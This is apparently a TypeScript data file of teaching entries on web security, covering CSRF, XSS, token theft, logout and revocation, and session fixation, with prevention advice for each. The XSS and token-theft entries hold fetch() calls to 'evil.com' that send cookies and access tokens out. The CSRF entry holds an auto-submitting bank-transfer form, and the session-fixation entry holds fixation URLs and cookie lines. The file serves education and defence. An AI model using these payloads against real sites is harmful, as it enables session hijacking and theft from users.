import { Concept } from "./types"

export const csrf: Concept = {
  id: "csrf",
  title: "CSRF (Cross-Site Request Forgery)",
  category: "security",
  difficulty: "intermediate",
  shortDescription: "How attackers forge malicious requests that appear to come from authenticated users",
  analogy: "CSRF is like someone forging your signature on a document - they trick the system into thinking you authorized an action you never intended to do, by exploiting the fact that you're already logged in.",
  details: `**The CSRF Attack Flow:**

  **Step 1: User Authentication**
  - User logs into target site (e.g., bank.com)
  - Session cookie stored in browser

  **Step 2: Attacker Sets Trap**
  - User visits malicious website
  - Malicious page contains hidden form or image

  **Step 3: Malicious Request**
  \`\`\`
  <!-- Hidden form that submits to bank -->
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>document.forms[0].submit()</script>
  \`\`\`

  **Step 4: Browser Sends Cookies**
  - Browser automatically includes session cookie
  - Bank sees "valid" authenticated request
  - Transfer completed!

  **CSRF Prevention Methods:**

  **1. CSRF Tokens**
  \`\`\`
  <input type="hidden" name="csrf_token" value="abc123xyz">
  \`\`\`
  - Unique per session
  - Server validates on each request

  **2. SameSite Cookies**
  \`\`\`
  Set-Cookie: session=abc; SameSite=Strict
  Set-Cookie: session=abc; SameSite=Lax
  \`\`\`
  - Browser doesn't send cookie on cross-site requests

  **3. Origin/Referer Header Check**
  - Verify request comes from expected origin
  - CORS provides some protection

  **4. Custom Headers**
  \`\`\`
  X-Requested-With: XMLHttpRequest
  \`\`\`
  - CORS blocks cross-origin with custom headers`,
  visualType: "flow",
  relatedConcepts: ["cookies-http-only", "xss"]
}

export const xss: Concept = {
  id: "xss",
  title: "XSS (Cross-Site Scripting)",
  category: "security",
  difficulty: "intermediate",
  shortDescription: "Code injection attacks that execute malicious scripts in victims' browsers",
  analogy: "XSS is like a spy hiding in a crowd at a party - they observe everything (steal tokens, cookies) and impersonate you while looking exactly like everyone else.",
  details: `**Types of XSS Attacks:**

  **1. Stored XSS (Persistent)**
  - Malicious script saved in database
  - Served to users who view the content
  - Most dangerous: affects all visitors

  **Example:**
  \`\`\`
  // Attacker posts comment with script
  <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    })
  </script>

  // Every user viewing this comment gets compromised
  \`\`\`

  **2. Reflected XSS**
  - Script in URL reflected back by server
  - User tricked into clicking malicious link
  - Example: Search results showing search term

  **3. DOM-based XSS**
  - Script executes in browser only
  - No server involvement
  - Vulnerable JavaScript code

  **XSS Consequences:**
  - Cookie/session theft
  - Credential harvesting
  - Defacement
  - Malware distribution
  - Keylogging
  - Phishing

  **XSS Prevention:**

  **1. Content Security Policy (CSP)**
  \`\`\`
  Content-Security-Policy:
    default-src 'self';
    script-src 'self';
  \`\`\`

  **2. Input Validation/Sanitization**
  \`\`\`
  // Use libraries like DOMPurify
  const clean = DOMPurify.sanitize(userInput)
  \`\`\`

  **3. Output Encoding**
  \`\`\`
  // HTML encoding
  & → &amp;
  < → &lt;
  > → &gt;
  " → &quot;
  ' → &#x27;
  \`\`\`

  **4. HTTP-only Cookies**
  - JavaScript cannot read cookies
  - Limits XSS impact`,
  visualType: "flow",
  relatedConcepts: ["csrf", "cookies-http-only"]
}

export const tokenTheft: Concept = {
  id: "token-theft",
  title: "Token Theft & Prevention",
  category: "security",
  difficulty: "intermediate",
  shortDescription: "How attackers steal authentication tokens and defense strategies to prevent it",
  analogy: "Token theft is like pickpocketing - attackers use various techniques to snatch your authentication badge, then impersonate you. Defense means making your badge hard to steal and detecting suspicious use.",
  details: `**Common Token Theft Methods:**

  **1. XSS Attacks**
  \`\`\`
  // Malicious script steals tokens
  fetch('https://evil.com', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('accessToken'),
      url: window.location.href,
      cookies: document.cookie
    })
  })
  \`\`\`

  **2. Man-in-the-Middle (MITM)**
  - Intercept unencrypted traffic
  - Extract tokens from HTTP requests
  - Common on public WiFi without HTTPS

  **3. Malicious Browser Extensions**
  - Extensions with broad permissions
  - Can read page content and localStorage
  - Keyloggers and form grabbers

  **4. URL Leakage**
  - Tokens in URL parameters
  - Referrer header leaking tokens
  - Browser history, bookmarks

  **5. Local Storage Access**
  - XSS gains access to localStorage
  - Shared computer attacks
  - Malicious browser extensions

  **Token Theft Prevention:**

  **1. Use HTTP-only Cookies**
  \`\`\`
  Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
  \`\`\`
  - JavaScript cannot access

  **2. Always Use HTTPS**
  - Encrypt all traffic
  - HSTS headers
  - Certificate pinning

  **3. Short Token Lifetimes**
  - 5-15 minute access tokens
  - Forces frequent re-authentication

  **4. Token Binding**
  \`\`\`
  Token bound to: IP, fingerprint, device ID
  Server validates binding on each request
  \`\`\`

  **5. Detect Anomalous Usage**
  - Unusual IP/location → require re-auth
  - Multiple concurrent sessions → alert
  - Impossible travel time detection`,
  visualType: "flow",
  relatedConcepts: ["xss", "token-expiry", "cookies-http-only"]
}

export const logoutRevocation: Concept = {
  id: "logout-revocation",
  title: "Logout & Token Revocation",
  category: "security",
  difficulty: "intermediate",
  shortDescription: "Properly ending sessions and invalidating tokens to prevent unauthorized access",
  analogy: "Logout is like returning your rental car - it signals the end of your access. The rental company marks the car as available (revoked), and you can no longer use your key.",
  details: `**The Logout Challenge with Stateless Tokens**
  Unlike sessions (which can be deleted from server), JWTs are stateless. Once issued, they exist until expiration.

  **Proper Logout Flow:**

  **Step 1: Client-Side Cleanup**
  \`\`\`
  // Clear local storage
  localStorage.removeItem('accessToken')
  localStorage.removeItem('refreshToken')
  sessionStorage.clear()
  \`\`\`

  **Step 2: Server-Side Revocation**
  \`\`\`
  POST /logout
  Authorization: Bearer <token>

  // Server actions:
  // 1. Invalidate refresh token in database
  // 2. Add access token to revocation list
  // 3. Clear any server session data
  // 4. Revoke OAuth tokens if applicable
  \`\`\`

  **Token Revocation Strategies:**

  **1. Token Blacklist**
  - Store revoked token IDs (JTI)
  - Check blacklist on each request
  - Use Redis for fast lookups
  - Clean up expired entries regularly

  **2. Token Families**
  \`\`\`
  // User has token family ID
  {
    sub: 'user123',
    tfm: 'abc123',  // Token family
    seq: 5          // Sequence number
  }

  // Logout invalidates entire family
  // New login creates new family
  \`\`\`

  **3. Short Token Lifetimes**
  - Access tokens expire quickly
  - Without valid refresh token, can't get new access
  - Limits revocation window

  **4. Server-Side Sessions**
  - Store token→user mapping
  - Logout = delete mapping
  - Trade-off: loses stateless benefits

  **Global Sign-Out:**
  \`\`\`
  POST /logout-all-devices
  // Invalidates all refresh tokens for user
  // Forces re-auth on all devices
  \`\`\``,
  visualType: "flow",
  relatedConcepts: ["token-expiry", "sessions-vs-tokens"]
}

export const sessionFixation: Concept = {
  id: "session-fixation",
  title: "Session Fixation Attacks",
  category: "security",
  difficulty: "intermediate",
  shortDescription: "How attackers set a user's session ID before authentication to hijack their account",
  analogy: "Session fixation is like a pickpocket switching your hotel key card with their own before you check in - when you use it, you're actually activating their pre-programmed access.",
  details: `**The Session Fixation Attack:**

  **Normal Flow:**
  \`\`\`
  1. User visits site → gets session ID
  2. User logs in → session becomes authenticated
  3. User accesses resources → session used
  \`\`\`

  **Attack Flow:**
  \`\`\`
  1. Attacker obtains valid session ID (or creates one)
  2. Attacker tricks user into using that session ID
  3. User logs in (session now authenticated)
  4. Attacker uses same session ID → full access!
  \`\`\`

  **Attack Methods:**
  \`\`\`
  // Method 1: URL Parameter
  https://vulnerable.com/login?session=ATTACKER_SESSION_ID

  // Method 2: Cookie Setting (XSS or MITM)
  document.cookie = "sessionId=ATTACKER_SESSION_ID"

  // Method 3: Meta Tag
  <meta http-equiv="Set-Cookie" content="session=ATTACKER_ID">
  \`\`\`

  **Real-World Example:**
  \`\`\`
  // Attacker visits site, gets session ID: ATTACKER_SESS
  // Attacker sends link to victim:
  https://bank.com/login?session=ATTACKER_SESS

  // Victim clicks, session cookie set to ATTACKER_SESS
  // Victim logs in with credentials
  // Session ATTACKER_SESS is now authenticated
  // Attacker logs in with ATTACKER_SESS → access!
  \`\`\`

  **Prevention: Session Regeneration**
  \`\`\`
  // After successful authentication
  app.post('/login', (req, res) => {
    const user = authenticate(req.body)

    // CRITICAL: Create NEW session
    const newSessionId = generateSecureId()
    req.sessionStore.destroy(req.session.id)  // Destroy old

    req.session.id = newSessionId
    req.session.userId = user.id
    req.session.save()

    // Attacker can't use old session ID now
  })
  \`\`\`

  **Additional Protections:**
  1. Regenerate session on privilege change
  2. Set session cookie AFTER authentication
  3. Use secure, HTTP-only cookies
  4. Validate session binds (IP, user agent)`,
  visualType: "flow",
  relatedConcepts: ["csrf", "session-management", "xss"]
}

export const securityConcepts = [
  csrf,
  xss,
  tokenTheft,
  logoutRevocation,
  sessionFixation,
]
